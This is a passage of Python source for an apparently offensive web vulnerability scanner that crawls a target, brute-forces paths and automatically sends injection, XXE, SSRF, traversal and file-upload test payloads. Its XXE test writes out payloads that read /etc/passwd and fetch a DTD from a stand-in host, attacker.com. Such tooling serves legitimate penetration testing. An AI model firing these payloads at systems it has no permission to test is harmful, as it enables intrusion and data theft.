                        print(f"{Fore.GREEN}[!] Interesting: {test_url}{Style.RESET_ALL}")

                elif status_code in [401, 403]:
                    logger.warning(f"Protected: {test_url} ({status_code})")
                    result['protected'] = True

                elif status_code == 500:
                    logger.warning(f"Server error: {test_url} ({status_code})")
                    result['server_error'] = True

                return result

        except Exception as e:
            logger.debug(f"Test failed for {test_url}: {e}")

        return None

    def _extract_form_endpoints(self, form, base_url: str):
        """Extract potential endpoints from form attributes"""
        endpoints = []

        # Check form action for API patterns
        action = form.get('action', '')
        if action and any(api_word in action.lower() for api_word in ['api', 'rest', 'graphql', 'soap']):
            endpoint_url = urljoin(base_url, action)
            self.discovered_endpoints.append({
                'url': endpoint_url,
                'type': 'form_api',
                'method': form.get('method', 'GET').upper(),
            })

        # Check input names for parameter-based endpoints
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            name = input_tag.get('name', '')
            if name and any(param in name.lower() for param in self.wordlists['parameters']):
                param_url = f"{base_url}?{name}=test"
                self.discovered_endpoints.append({
                    'url': param_url,
                    'type': 'form_parameter',
                    'parameter': name,
                    'method': form.get('method', 'GET').upper(),
                })

        return endpoints

    def _extract_js_endpoints(self, content: str, base_url: str) -> List[str]:
        """Extract endpoints from JavaScript code"""
        endpoints = []

        # Patterns for API calls in JavaScript
        js_patterns = [
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.(?:get|post|put|delete|patch)\(["\']([^"\']+)["\']',
            r'\$\.(?:get|post|ajax)\([^)]*url\s*:\s*["\']([^"\']+)["\']',
            r'XMLHttpRequest\(\)\.open\(["\'](?:GET|POST|PUT|DELETE)["\']\s*,\s*["\']([^"\']+)["\']',
            r'\.src\s*=\s*["\']([^"\']+)["\']',
            r'window\.location\s*=\s*["\']([^"\']+)["\']',
            r'\.href\s*=\s*["\']([^"\']+)["\']',
            r'["\'](/api/[^"\']+)["\']',
            r'["\'](/v\d+/[^"\']+)["\']',
            r'["\'](https?://[^/]+/api/[^"\']+)["\']',
        ]

        for pattern in js_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if match:
                    # Make URL absolute
                    if not match.startswith('http'):
                        match = urljoin(base_url, match)

                    # Clean and deduplicate
                    clean_url = self._clean_url(match)
                    if clean_url not in endpoints:
                        endpoints.append(clean_url)

        return endpoints

    def _find_api_patterns(self, url: str, content: str) -> List[str]:
        """Find API-like patterns in URLs and content"""
        patterns = []

        # Check current URL for API patterns
        if any(api_word in url.lower() for api_word in ['api', 'rest', 'graphql', 'soap', 'json', 'xml']):
            patterns.append(url)

        # Check content for API documentation
        doc_patterns = [
            r'"swagger":\s*["\']([^"\']+)["\']',
            r'"openapi":\s*["\']([^"\']+)["\']',
            r'<link[^>]*href=["\']([^"\']+swagger[^"\']*)["\'][^>]*>',
            r'<link[^>]*href=["\']([^"\']+openapi[^"\']*)["\'][^>]*>',
        ]

        for pattern in doc_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if match:
                    api_url = urljoin(url, match)
                    patterns.append(api_url)

        return patterns

    def _clean_url(self, url: str) -> str:
        """Clean and normalize URL"""
        # Remove fragments
        url = url.split('#')[0]

        # Remove query parameters for directory checking
        if '?' in url:
            url = url.split('?')[0]

        # Ensure proper format
        parsed = urlparse(url)
        clean_path = parsed.path

        # Remove double slashes
        clean_path = re.sub(r'/+', '/', clean_path)

        # Reconstruct URL
        cleaned = f"{parsed.scheme}://{parsed.netloc}{clean_path}"

        return cleaned.rstrip('/')

    def _is_interesting_path(self, url: str) -> bool:
        """Check if a path is interesting for discovery"""
        # Skip common static files
        static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif',
                             '.ico', '.svg', '.woff', '.woff2', '.ttf', '.eot']

        if any(url.lower().endswith(ext) for ext in static_extensions):
            return False

        # Check for interesting patterns
        interesting_patterns = [
            'api', 'admin', 'login', 'config', 'backup',
            'upload', 'download', 'test', 'debug',
            'php', 'asp', 'jsp', 'aspx', 'do',
            'sql', 'db', 'json', 'xml', 'yaml',
        ]

        url_lower = url.lower()
        return any(pattern in url_lower for pattern in interesting_patterns)

    def _add_discovered_path(self, url: str, source: str, depth: int):
        """Add a discovered path to results"""
        clean_url = self._clean_url(url)

        # Skip if already exists
        if any(p['url'] == clean_url for p in self.discovered_paths):
            return

        # Add to discovered paths
        self.discovered_paths.append({
            'url': clean_url,
            'status': 'discovered',
            'source': source,
            'depth': depth,
            'is_directory': clean_url.endswith('/'),
            'is_file': '.' in clean_url.split('/')[-1] if '/' in clean_url else False,
        })

    def _is_directory(self, response, target: str) -> bool:
        """Check if response indicates a directory"""
        content_type = response.headers.get('Content-Type', '').lower()

        # Common directory indicators
        if 'text/html' in content_type and hasattr(response, 'text'):
            html_content = response.text.lower()

            dir_indicators = [
                'index of', 'directory listing', 'parent directory',
                'directory of', '<title>directory', 'folder contents',
            ]

            if any(indicator in html_content for indicator in dir_indicators):
                return True

        # URL pattern indicators
        if not target or target.endswith('/'):
            return True

        # No extension often indicates directory
        if '.' not in target.split('/')[-1]:
            return True

        return False

    def _is_file(self, target: str, content_type: str) -> bool:
        """Check if target is likely a file"""
        if not target:
            return False

        # Has file extension
        if '.' in target.split('/')[-1]:
            return True

        # Content type indicates file
        file_content_types = [
            'application/', 'image/', 'audio/', 'video/',
            'text/css', 'text/javascript', 'application/javascript',
        ]

        return any(ct in content_type.lower() for ct in file_content_types)

    def _is_api_endpoint(self, url: str, content_type: str) -> bool:
        """Check if URL is likely an API endpoint"""
        url_lower = url.lower()

        # URL patterns
        api_patterns = [
            '/api/', '/rest/', '/graphql', '/soap/', '/wsdl',
            '/json', '/xml', '/yaml', '/yml',
            '?api_key=', '?token=', '?access_token=',
        ]

        if any(pattern in url_lower for pattern in api_patterns):
            return True

        # Content type patterns
        api_content_types = [
            'application/json', 'application/xml', 'text/xml',
            'application/yaml', 'application/x-yaml',
        ]

        return any(ct in content_type.lower() for ct in api_content_types)

    def _has_interesting_content(self, response) -> bool:
        """Check if response has interesting content"""
        if not hasattr(response, 'text'):
            return False

        content = response.text.lower()

        # Check for sensitive information
        sensitive_patterns = [
            'password', 'secret', 'token', 'api_key',
            'database', 'config', 'credentials',
            'error in your sql syntax',
            'warning:', 'notice:', 'fatal error',
            'root:x:', 'administrator:',
            '<?php', '<%', '<jsp:', '<asp:',
        ]

        return any(pattern in content for pattern in sensitive_patterns)





# --- ENHANCED VULNERABILITY SCANNER ---
class EnhancedVulnerabilityScanner:
    """Main scanner class integrating all components"""

    def __init__(self, target_url: str, authorized: bool = True):
        if not authorized:
            raise ValueError("Authorization required")

        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        })
        self.session.verify = False

        # Initialize engines
        self.recon = ReconnaissanceEngine(target_url, self.session)
        self.payload_mutator = EnhancedPayloadMutator()
        self.response_analyzer = EnhancedResponseAnalyzer()
        self.input_discovery = InputDiscoveryEngine(self.session)
        #self.dir_bruteforcer = DirectoryBruteforcer(self.session)
        self.dir_bruteforcer = EnhancedDirectoryBruteforcer(self.session)

        # Data storage
        self.vulnerabilities = []
        self.discovered_inputs = []
        self.discovered_paths = []
        self.technology_stack = []

        self.scan_start = datetime.now()

        self._print_banner()
        logger.info(f"Enhanced scan started for target: {self.target_url}")

    def _print_banner(self):
        banner = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════════════╗
║     ADVANCED PENETRATION TESTING FRAMEWORK v6.0 - ENHANCED          ║
║  Reconnaissance | Input Discovery | Advanced Analysis | Reporting   ║
║  SQLi | XSS | RCE | SSRF | LFI | XXE | IDOR | File Upload | CSRF    ║
╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
Target: {self.target_url}
Scan Start: {self.scan_start.strftime('%Y-%m-%d %H:%M:%S')}
Mode: Comprehensive Security Assessment
        """
        print(banner)

    '''def run_reconnaissance(self):
        """Run comprehensive reconnaissance"""
        print(f"{Fore.BLUE}[*] PHASE 1: RECONNAISSANCE & INFORMATION GATHERING{Style.RESET_ALL}")

        try:
            # Initial request
            response = self.session.get(self.target_url, timeout=10)

            # Technology detection
            self.technology_stack = self.recon.gather_technologies(response)
            print(
                f"{Fore.GREEN}[+] Technology stack detected: {', '.join(self.technology_stack[:10])}{Style.RESET_ALL}")

            # Extract JavaScript files
            self.recon.extract_js_files(response.text, self.target_url)
            if self.recon.js_files:
                print(f"{Fore.GREEN}[+] Found {len(self.recon.js_files)} JavaScript files{Style.RESET_ALL}")

            # Find hidden paths
            hidden_paths = self.recon.find_hidden_paths()
            if hidden_paths:
                print(f"{Fore.GREEN}[+] Found {len(hidden_paths)} hidden paths{Style.RESET_ALL}")

            # Directory brute force
            print(f"{Fore.BLUE}[*] Running directory brute force...{Style.RESET_ALL}")
            discovered_paths = self.dir_bruteforcer.brute_force(self.target_url, depth=2)
            self.discovered_paths = discovered_paths

            if discovered_paths:
                print(f"{Fore.GREEN}[+] Found {len(discovered_paths)} directories/files{Style.RESET_ALL}")
                for path in discovered_paths[:5]:  # Show first 5
                    print(f"  {path['url']} ({path['status']})")

            # Discover inputs from initial page
            self._discover_inputs(response.text, self.target_url)

        except Exception as e:
            logger.error(f"Reconnaissance error: {e}")
            print(f"{Fore.RED}[-] Reconnaissance failed: {e}{Style.RESET_ALL}")'''

    def run_reconnaissance(self):
        """Run comprehensive reconnaissance"""
        print(f"{Fore.BLUE}[*] PHASE 1: RECONNAISSANCE & INFORMATION GATHERING{Style.RESET_ALL}")

        try:
            # Initial request
            response = self.session.get(self.target_url, timeout=10)

            # Technology detection
            self.technology_stack = self.recon.gather_technologies(response)
            if self.technology_stack:
                print(
                    f"{Fore.GREEN}[+] Technology stack detected: {', '.join(self.technology_stack[:10])}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[-] No technology stack detected{Style.RESET_ALL}")

            # Extract JavaScript files
            self.recon.extract_js_files(response.text, self.target_url)
            if self.recon.js_files:
                print(f"{Fore.GREEN}[+] Found {len(self.recon.js_files)} JavaScript files{Style.RESET_ALL}")

            # Find hidden paths
            hidden_paths = self.recon.find_hidden_paths()
            if hidden_paths:
                print(f"{Fore.GREEN}[+] Found {len(hidden_paths)} hidden paths{Style.RESET_ALL}")

            # Enhanced recursive directory discovery
            print(f"{Fore.BLUE}[*] Starting enhanced recursive discovery...{Style.RESET_ALL}")
            try:
                discovered_paths = self.dir_bruteforcer.recursive_discovery(self.target_url,
                                                                            max_depth=2)  # Reduced depth for testing
                self.discovered_paths = discovered_paths

                if discovered_paths:
                    print(f"{Fore.GREEN}[+] Found {len(discovered_paths)} directories/files{Style.RESET_ALL}")

                    # Show categorized results
                    self._categorize_and_show_results(discovered_paths)
                else:
                    print(f"{Fore.YELLOW}[-] No directories/files found{Style.RESET_ALL}")

            except Exception as e:
                print(f"{Fore.RED}[-] Directory discovery error: {e}{Style.RESET_ALL}")
                logger.error(f"Directory discovery error: {e}")

            # Discover inputs from initial page
            self._discover_inputs(response.text, self.target_url)

            # Crawl the website to find more pages and inputs
            try:
                self._crawl_website(response.text, self.target_url, max_pages=10)
            except Exception as e:
                print(f"{Fore.YELLOW}[-] Crawling limited: {e}{Style.RESET_ALL}")
                logger.warning(f"Crawling error: {e}")

        except Exception as e:
            logger.error(f"Reconnaissance error: {e}")
            print(f"{Fore.RED}[-] Reconnaissance failed: {e}{Style.RESET_ALL}")

    def _categorize_and_show_results(self, discovered_paths: List[Dict]):
        """Categorize and display discovered paths"""
        categories = {
            'Directories': [],
            'Files': [],
            'API Endpoints': [],
            'Admin Pages': [],
            'Login Pages': [],
            'Configuration Files': [],
            'Backup Files': [],
            'Interesting': [],
        }

        for path in discovered_paths:
            url = path.get('url', '')
            status = path.get('status', 0)

            # Ensure status is integer for comparison
            if isinstance(status, str) and status.isdigit():
                status = int(status)
            elif not isinstance(status, int):
                status = 0  # Default to 0 if not a valid number

            # Categorize based on URL patterns
            url_lower = url.lower()

            if path.get('is_api', False) or any(api_word in url_lower for api_word in ['/api/', '/rest/', '/graphql']):
                categories['API Endpoints'].append((path, status))
            elif any(admin_word in url_lower for admin_word in ['/admin', '/administrator', '/dashboard', '/backend']):
                categories['Admin Pages'].append((path, status))
            elif any(login_word in url_lower for login_word in ['/login', '/signin', '/auth', '/authenticate']):
                categories['Login Pages'].append((path, status))
            elif any(config_word in url_lower for config_word in ['config', 'settings', '.env', '.htaccess']):
                categories['Configuration Files'].append((path, status))
            elif any(backup_word in url_lower for backup_word in ['backup', '.bak', '.old', 'dump']):
                categories['Backup Files'].append((path, status))
            elif path.get('is_directory', False):
                categories['Directories'].append((path, status))
            elif path.get('is_file', False):
                categories['Files'].append((path, status))
            elif path.get('interesting', False):
                categories['Interesting'].append((path, status))

        # Display results by category
        for category, items in categories.items():
            if items:
                # Sort by status code (successful first)
                try:
                    items.sort(key=lambda x: (0 if isinstance(x[1], int) and x[1] == 200 else
                                              1 if isinstance(x[1], int) and x[1] in [401, 403] else
                                              2 if isinstance(x[1], int) and x[1] >= 400 else 3))
                except:
                    pass  # Skip sorting if there's an error

                print(f"\n{Fore.CYAN}[*] {category} ({len(items)}):{Style.RESET_ALL}")
                for item, status in items[:5]:  # Show first 5
                    url = item.get('url', 'Unknown')
                    status_display = status if isinstance(status, int) else str(status)

                    # Set color based on status
                    if isinstance(status, int):
                        if status == 200:
                            status_color = Fore.GREEN
                        elif status in [401, 403]:
                            status_color = Fore.YELLOW
                        elif status >= 400:
                            status_color = Fore.RED
                        else:
                            status_color = Fore.WHITE
                    else:
                        status_color = Fore.WHITE

                    print(f"  {status_color}{status_display}{Style.RESET_ALL} {url}")
                if len(items) > 5:
                    print(f"  ... and {len(items) - 5} more")

    # Add this method to crawl the website:
    def _crawl_website(self, content: str, base_url: str, max_pages: int = 10):
        """Crawl website to find more pages and inputs"""
        print(f"{Fore.BLUE}[*] Crawling website for more pages...{Style.RESET_ALL}")

        visited = set()
        to_visit = [base_url]
        pages_found = 0

        while to_visit and pages_found < max_pages:
            current_url = to_visit.pop(0)

            if current_url in visited:
                continue

            visited.add(current_url)

            try:
                # Don't crawl external links
                if urlparse(current_url).netloc != urlparse(base_url).netloc:
                    continue

                response = self.session.get(current_url, timeout=5, verify=False)
                soup = BeautifulSoup(response.text, 'html.parser')

                # Discover inputs on this page
                self._discover_inputs(response.text, current_url)

                # Find all links on the page
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    absolute_url = urljoin(current_url, href)

                    # Only add internal URLs
                    if urlparse(absolute_url).netloc == urlparse(base_url).netloc:
                        if absolute_url not in visited and absolute_url not in to_visit:
                            to_visit.append(absolute_url)
                            pages_found += 1

                # Find all forms on the page
                for form in soup.find_all('form'):
                    form_action = form.get('action', '')
                    if form_action:
                        form_url = urljoin(current_url, form_action)
                        if form_url not in visited and form_url not in to_visit:
                            to_visit.append(form_url)
                            pages_found += 1

            except Exception as e:
                logger.debug(f"Crawling error for {current_url}: {e}")

        print(f"{Fore.GREEN}[+] Crawled {len(visited)} pages{Style.RESET_ALL}")

    def _discover_inputs(self, content: str, base_url: str):
        """Discover all input parameters"""
        print(f"{Fore.BLUE}[*] Discovering input parameters...{Style.RESET_ALL}")

        # HTML inputs
        html_inputs = self.input_discovery.discover_from_html(content, base_url)
        self.discovered_inputs.extend(html_inputs)

        # URL parameters
        url_inputs = self.input_discovery.discover_from_url(base_url)
        self.discovered_inputs.extend(url_inputs)

        # JavaScript analysis (if JS files found)
        for js_url in self.recon.js_files[:5]:  # Limit to first 5 JS files
            try:
                js_response = self.session.get(js_url, timeout=5)
                js_inputs = self.input_discovery.discover_from_js(js_response.text, base_url)
                self.discovered_inputs.extend(js_inputs)
            except:
                pass

        # API endpoints from JS
        for api_url in self.recon.api_endpoints[:10]:
            self.discovered_inputs.append({
                'url': api_url,
                'method': 'GET',
                'inputs': [{'name': 'test', 'type': 'text', 'value': ''}],
                'source': 'js_api_endpoint'
            })

        # Deduplicate inputs
        unique_inputs = []
        seen = set()

        for inp in self.discovered_inputs:
            key = (inp['url'], inp['method'], tuple(sorted(i['name'] for i in inp['inputs'])))
            if key not in seen:
                seen.add(key)
                unique_inputs.append(inp)

        self.discovered_inputs = unique_inputs

        print(f"{Fore.GREEN}[+] Discovered {len(self.discovered_inputs)} input points{Style.RESET_ALL}")

    def test_all_vulnerabilities(self):
        """Test for all vulnerability types"""
        print(f"\n{Fore.BLUE}[*] PHASE 2: VULNERABILITY SCANNING{Style.RESET_ALL}")

        # Flatten all inputs for testing
        all_test_targets = []
        for input_point in self.discovered_inputs:
            for inp in input_point['inputs']:
                # Skip hidden inputs for certain tests
                input_type = inp.get('type', '').lower()
                if input_type in ['hidden', 'submit', 'button', 'reset']:
                    continue

                all_test_targets.append({
                    'url': input_point['url'],
                    'method': input_point['method'],
                    'parameter': inp['name'],
                    'original_value': inp.get('value', ''),
                    'source': input_point.get('source', 'unknown'),
                    'input_type': input_type
                })

        # Add discovered paths as test targets (fix status comparison)
        for path in self.discovered_paths:
            status = path.get('status', 0)

            # Convert status to int if it's a string
            if isinstance(status, str):
                try:
                    if status.isdigit():
                        status = int(status)
                    elif status == 'discovered':  # Handle string status
                        status = 200  # Assume 200 for discovered items
                    else:
                        status = 0
                except:
                    status = 0

            # Only test if status < 400 (successful or client error)
            if status < 400 or status == 500:  # Also test 500 errors
                all_test_targets.append({
                    'url': path.get('url', ''),
                    'method': 'GET',
                    'parameter': 'test',
                    'original_value': '',
                    'source': 'directory_scan',
                    'input_type': 'url'
                })

        print(f"{Fore.CYAN}[*] Testing {len(all_test_targets)} parameters{Style.RESET_ALL}")

        # Test each parameter with all vulnerability types
        test_methods = [
            ('SQL Injection', self.test_sql_injection),
            ('XSS', self.test_xss),
            ('Command Injection', self.test_command_injection),
            ('SSRF', self.test_ssrf),
            ('Path Traversal', self.test_path_traversal),
            ('XXE', self.test_xxe),
            ('IDOR', self.test_idor),
            ('File Upload', self.test_file_upload),
        ]

        total_tests = len(all_test_targets) * len(test_methods)
        completed_tests = 0

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []

            # Create test tasks
            for target in all_test_targets[:100]:  # Limit to 100 targets for testing
                for test_name, test_func in test_methods:
                    # Skip certain tests based on input type
                    input_type = target.get('input_type', '')

                    if test_name == 'XSS' and input_type not in ['text', 'search', 'url', 'email', 'textarea', '']:
                        continue

                    if test_name == 'SSRF' and input_type not in ['url', 'text', '']:
                        continue

                    if test_name == 'File Upload' and input_type not in ['file', '']:
                        continue

                    futures.append(executor.submit(test_func, target))

            # Process results
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                    completed_tests += 1

                    # Show progress
                    if completed_tests % 20 == 0:
                        progress = (completed_tests / total_tests) * 100 if total_tests > 0 else 0
                        print(
                            f"{Fore.CYAN}[*] Progress: {completed_tests}/{total_tests} tests ({progress:.1f}%){Style.RESET_ALL}")

                except Exception as e:
                    logger.error(f"Test error: {e}")

        print(f"{Fore.GREEN}[+] Vulnerability scanning complete{Style.RESET_ALL}")

    def test_sql_injection(self, target: Dict):
        """Test for SQL injection"""
        # Get baseline
        baseline = self._get_baseline(target)
        if not baseline:
            return

        # Test more payloads
        payloads = self.payload_mutator.generate_advanced_sqli_payloads()[:70]  # Increased from 20

        for payload in payloads:
            try:
                result = self._send_test_request(target, payload)
                if not result:
                    continue

                confidence, indicators, evidence = self.response_analyzer.analyze_sql_injection(
                    baseline['response_text'], result.response_text,
                    baseline['response_time'], result.response_time,
                    payload
                )

                # Lower threshold for detection
                if confidence >= 30:  # Lowered from 40
                    self._record_vulnerability(
                        vuln_type='SQL_INJECTION',
                        target=target,
                        payload=payload,
                        result=result,
                        confidence=confidence,
                        indicators=indicators,
                        evidence=evidence
                    )

                    # Log details for debugging
                    logger.info(
                        f"SQLi detected: {target['url']}?{target['parameter']}={payload[:50]} (Confidence: {confidence}%)")
                    break

            except Exception as e:
                logger.debug(f"SQLi test error: {e}")

    def test_xss(self, target: Dict):
        """Test for XSS with better reflection detection"""
        baseline = self._get_baseline(target)
        if not baseline:
            return

        # Test more payloads
        payloads = self.payload_mutator.generate_xss_payloads()[:30]  # Increased from 15

        for payload in payloads:
            try:
                result = self._send_test_request(target, payload)
                if not result:
                    continue

                confidence, indicators, evidence = self.response_analyzer.analyze_xss(
                    baseline['response_text'], result.response_text, payload
                )

                # Also check for simple reflection
                reflection_confidence = self._check_xss_reflection(payload, baseline['response_text'],
                                                                   result.response_text)
                confidence = max(confidence, reflection_confidence)

                if confidence >= 40:  # Lowered from 50
                    self._record_vulnerability(
                        vuln_type='CROSS_SITE_SCRIPTING',
                        target=target,
                        payload=payload,
                        result=result,
                        confidence=confidence,
                        indicators=indicators,
                        evidence=evidence
                    )
                    logger.info(f"XSS detected: {target['url']}?{target['parameter']}={payload[:50]}")
                    break

            except Exception as e:
                logger.debug(f"XSS test error: {e}")

    def _check_xss_reflection(self, payload: str, baseline: str, test: str) -> int:
        """Check if payload is reflected in response"""
        confidence = 0

        # Direct reflection
        if payload in test:
            confidence += 60

        # URL encoded reflection
        encoded_payload = quote(payload)
        if encoded_payload in test:
            confidence += 40

        # HTML encoded reflection
        html_encoded = html.escape(payload)
        if html_encoded in test:
            confidence += 30

        # Partial reflection
        if len(payload) > 10:
            for i in range(0, len(payload), 5):
                chunk = payload[i:i + 10]
                if chunk in test and chunk not in baseline:
                    confidence += 10

        return min(confidence, 100)

    def test_command_injection(self, target: Dict):
        """Test for command injection"""
        baseline = self._get_baseline(target)
        if not baseline:
            return

        payloads = self.payload_mutator.generate_command_injection_payloads()[:15]

        for payload in payloads:
            result = self._send_test_request(target, payload)
            if not result:
                continue

            confidence, indicators, evidence = self.response_analyzer.analyze_command_injection(
                baseline['response_text'], result.response_text, payload
            )

            if confidence >= 40:
                self._record_vulnerability(
                    vuln_type='COMMAND_INJECTION',
                    target=target,
                    payload=payload,
                    result=result,
                    confidence=confidence,
                    indicators=indicators,
                    evidence=evidence
                )
                break

    def test_ssrf(self, target: Dict):
        """Test for SSRF with better validation"""
        payloads = self.payload_mutator.generate_ssrf_payloads()[:10]

        for payload in payloads:
            try:
                result = self._send_test_request(target, payload)
                if not result:
                    continue

                confidence = 0
                indicators = []
                evidence = {}

                # Check for SSRF-specific patterns
                ssrf_indicators = [
                    ('Connection refused', 20),
                    ('Connection timeout', 20),
                    ('No route to host', 20),
                    ('Network is unreachable', 20),
                    ('could not resolve host', 20),
                    ('Invalid URL', 10),
                    ('Invalid host', 10),
                ]

                for indicator, score in ssrf_indicators:
                    if indicator.lower() in result.response_text.lower():
                        indicators.append(f"SSRF indicator: {indicator}")
                        confidence += score

                # Check for internal IPs in response (but be careful)
                internal_ips = ['127.0.0.1', 'localhost']
                for ip in internal_ips:
                    if ip in result.response_text and ip not in payload:
                        indicators.append(f"Internal IP found in response: {ip}")
                        confidence += 40
                        evidence['internal_ip'] = ip

                # Check for metadata access (more specific)
                if '169.254.169.254' in payload:
                    if 'ami-id' in result.response_text or 'instance-id' in result.response_text:
                        indicators.append("AWS metadata accessed")
                        confidence += 80
                        evidence['aws_metadata'] = True

                # Check for file contents (very specific)
                if 'root:x:' in result.response_text and 'root:x:' not in payload:
                    indicators.append("/etc/passwd file accessed")
                    confidence += 90
                    evidence['file_access'] = True

                # Don't trigger on common error messages
                common_errors = ['Page not found', '404', 'Not Found', 'Error']
                for error in common_errors:
                    if error in result.response_text:
                        confidence -= 10

                confidence = max(0, confidence)

                if confidence >= 50:  # Increased threshold
                    self._record_vulnerability(
                        vuln_type='SSRF',
                        target=target,
                        payload=payload,
                        result=result,
                        confidence=confidence,
                        indicators=indicators,
                        evidence=evidence
                    )
                    break

            except Exception as e:
                logger.debug(f"SSRF test error: {e}")

    def test_path_traversal(self, target: Dict):
        """Test for path traversal with enhanced payloads"""
        baseline = self._get_baseline(target)
        if not baseline:
            return

        # Use enhanced payloads
        payloads = self.payload_mutator.generate_directory_traversal_payloads()[:20]

        for payload in payloads:
            result = self._send_test_request(target, payload)
            if not result:
                continue

            confidence = 0
            indicators = []
            evidence = {}

            # Check for file contents
            file_indicators = {
                'root:x:': '/etc/passwd (Unix)',
                '[boot loader]': 'boot.ini (Windows)',
                '[drivers]': 'system.ini (Windows)',
                '<?xml': 'XML configuration file',
                'Database error': 'Database config',
                'Warning:': 'PHP configuration',
                'define(\'DB_': 'Database configuration',
                'API_KEY': 'API key in config',
                'SECRET_KEY': 'Secret key',
                'password': 'Password in config',
            }

            for indicator, file_type in file_indicators.items():
                if indicator.lower() in result.response_text.lower() and indicator.lower() not in baseline[
                    'response_text'].lower():
                    indicators.append(f"File accessed: {file_type}")
                    confidence += 40
                    evidence['file_type'] = file_type

            # Check for directory listing
            dir_patterns = [
                r'<title>Index of',
                r'Parent Directory</a>',
                r'Directory Listing',
                r'<h1>Directory listing for',
            ]

            for pattern in dir_patterns:
                if re.search(pattern, result.response_text, re.IGNORECASE):
                    indicators.append("Directory listing enabled")
                    confidence += 30
                    evidence['directory_listing'] = True

            # Check for error messages indicating file access
            error_patterns = [
                r'No such file or directory',
                r'File not found',
                r'Failed to open stream',
                r'Warning: include',
                r'Warning: require',
                r'failed to open dir',
                r'Permission denied',
            ]

            for pattern in error_patterns:
                if re.search(pattern, result.response_text, re.IGNORECASE):
                    indicators.append(f"File system error: {pattern}")
                    confidence += 20
                    evidence['filesystem_error'] = True

            if confidence >= 30:  # Lower threshold for detection
                self._record_vulnerability(
                    vuln_type='PATH_TRAVERSAL',
                    target=target,
                    payload=payload,
                    result=result,
                    confidence=confidence,
                    indicators=indicators,
                    evidence=evidence
                )
                break

    def test_xxe(self, target: Dict):
        """Test for XXE injection"""
        # Only test if parameter might accept XML
        if not any(xml_indicator in target['parameter'].lower() for xml_indicator in ['xml', 'data', 'payload']):
            return

        payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><data>&send;</data>',
        ]

        for payload in payloads:
            result = self._send_test_request(target, payload, content_type='application/xml')
            if not result:
                continue

            confidence = 0
            indicators = []

            if 'root:x:' in result.response_text or '[boot loader]' in result.response_text:
                indicators.append("File content leaked via XXE")
                confidence += 70

            if 'XML parsing error' in result.response_text or 'DOCTYPE' in result.response_text:
                indicators.append("XML parsing error (potential XXE)")
                confidence += 30

            if confidence >= 40:
                self._record_vulnerability(
                    vuln_type='XXE',
                    target=target,
                    payload=payload[:100],
                    result=result,
                    confidence=confidence,
                    indicators=indicators
                )
                break

    def test_idor(self, target: Dict):
        """Test for IDOR"""
        # Only test numeric or UUID-like parameters
        param_value = target.get('original_value', '')

        if re.match(r'^\d+$', param_value):
            # Test with other IDs
            test_ids = ['1', '0', '100', '999', 'admin', 'true']
        elif re.match(r'^[a-f0-9-]{36}$', param_value.lower()):
            test_ids = ['00000000-0000-0000-0000-000000000000',
                        '11111111-1111-1111-1111-111111111111']
        else:
            return

        baseline = self._get_baseline(target)
        if not baseline:
            return

        for test_id in test_ids:
            result = self._send_test_request(target, test_id)
            if not result:
                continue

            # Check for access to different resource
            if result.status_code == 200 and baseline['status_code'] == 200:
                # Compare responses
                baseline_hash = hashlib.md5(baseline['response_text'].encode()).hexdigest()
                test_hash = hashlib.md5(result.response_text.encode()).hexdigest()

                if baseline_hash != test_hash:
                    self._record_vulnerability(
                        vuln_type='IDOR',
                        target=target,
                        payload=test_id,
                        result=result,
                        confidence=60,
                        indicators=['Different response for different ID']
                    )
                    break

    def test_file_upload(self, target: Dict):
        """Test for file upload vulnerabilities"""
        # Only test parameters that might accept files
        if not any(upload_indicator in target['parameter'].lower() for upload_indicator in
                   ['file', 'upload', 'image', 'photo', 'attachment']):
            return

        payloads = self.payload_mutator.generate_file_upload_payloads()[:5]

        for filename, content, *extra in payloads:
            content_type = extra[0] if extra else 'application/octet-stream'

            files = {
                target['parameter']: (filename, content, content_type)
            }

            try:
                if target['method'] == 'GET':
                    response = self.session.get(target['url'], timeout=10)
                else:
                    response = self.session.post(target['url'], files=files, timeout=10)

                result = TestResult(
                    injection_point=target['url'],
                    parameter=target['parameter'],
                    payload=f"File: {filename}",
                    method=target['method'],
                    response_time=response.elapsed.total_seconds(),
                    status_code=response.status_code,
                    content_length=len(response.text),
                    response_text=response.text[:8000],
                    detection_indicators=[]
                )

                # Check if file was uploaded
                if response.status_code == 200:
                    # Try to access the uploaded file
                    uploaded_url = urljoin(target['url'], filename)
                    check_response = self.session.get(uploaded_url, timeout=5)

                    if check_response.status_code == 200:
                        self._record_vulnerability(
                            vuln_type='FILE_UPLOAD',
                            target=target,
                            payload=f"File: {filename}",
                            result=result,
                            confidence=80,
                            indicators=['File uploaded and accessible']
                        )
                        break

            except Exception as e:
                logger.debug(f"File upload test failed: {e}")

    def _get_baseline(self, target: Dict) -> Optional[Dict]:
        """Get baseline response"""
        try:
            if target['method'] == 'GET':
                params = {target['parameter']: 'test123'}
                response = self.session.get(target['url'], params=params, timeout=10)
            else:
                data = {target['parameter']: 'test123'}
                response = self.session.post(target['url'], data=data, timeout=10)

            return {
                'response_text': response.text,
